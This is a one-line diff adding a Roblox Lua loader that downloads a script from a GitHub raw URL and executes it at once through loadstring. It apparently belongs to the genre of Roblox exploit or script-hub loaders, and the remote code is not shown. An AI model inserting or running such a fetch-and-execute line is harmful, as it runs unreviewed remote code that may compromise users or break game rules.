@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/DocYogurt/repo/raw/main/NB2024.lua"))()
